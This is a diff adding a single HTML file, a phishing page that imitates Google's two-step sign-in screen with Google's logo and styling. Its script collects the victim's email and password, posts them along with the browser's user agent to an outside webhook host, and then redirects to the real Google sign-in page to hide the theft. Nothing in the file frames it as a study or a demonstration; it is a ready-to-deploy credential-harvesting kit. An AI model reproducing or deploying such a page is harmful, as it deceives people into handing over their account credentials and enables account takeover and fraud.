@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Account</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f1f1f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #202124;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 400px;
+            text-align: left;
+        }
+        .google-logo {
+            width: 75px;
+            margin-bottom: 25px;
+            display: block;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        .email-display {
+            font-size: 14px;
+            color: #202124;
+            margin-bottom: 20px;
+            padding: 10px;
+            background-color: #f8f9fa;
+            border-radius: 4px;
+        }
+        .input-label {
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            display: block;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+            margin-bottom: 25px;
+        }
+        input[type="email"]:focus, input[type="password"]:focus {
+            outline: none;
+            border: 2px solid #1a73e8;
+        }
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .create-account, .forgot-password {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .next-button:hover {
+            background-color: #1565c0;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+        
+        <!-- Email Screen -->
+        <div id="emailScreen">
+            <h1>Sign in to add a Google Account</h1>
+            <p class="subtitle">Email or phone</p>
+            <form id="emailForm">
+                <label class="input-label">Email or phone</label>
+                <input type="email" id="email" required autofocus>
+                <div class="button-container">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="button" class="next-button" onclick="showPasswordScreen()">Next</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Password Screen -->
+        <div id="passwordScreen" class="hidden">
+            <h1>Welcome</h1>
+            <div class="email-display" id="emailDisplay"></div>
+            <form id="passwordForm">
+                <label class="input-label">Enter your password</label>
+                <input type="password" id="password" required autofocus>
+                <div class="button-container">
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                    <button type="button" class="next-button" onclick="submitCredentials()">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        let userEmail = '';
+        const webhookUrl = 'https://absurd-kitchen-80.webhook.cool';
+
+        function showPasswordScreen() {
+            userEmail = document.getElementById('email').value;
+            if (userEmail) {
+                document.getElementById('emailScreen').classList.add('hidden');
+                document.getElementById('passwordScreen').classList.remove('hidden');
+                document.getElementById('emailDisplay').textContent = userEmail;
+                document.getElementById('password').focus();
+            }
+        }
+
+        function submitCredentials() {
+            const password = document.getElementById('password').value;
+            
+            if (password) {
+                // Send captured credentials to webhook
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: userEmail,
+                        password: password,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString(),
+                        type: 'google_account_complete'
+                    })
+                })
+                .then(response => {
+                    // Redirect to actual Google after capturing
+                    window.location.href = 'https://accounts.google.com';
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    window.location.href = 'https://accounts.google.com';
+                });
+            }
+        }
+
+        // Allow form submission with Enter key
+        document.getElementById('email').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                showPasswordScreen();
+            }
+        });
+
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                submitCredentials();
+            }
+        });
+    </script>
+</body>
+</html>
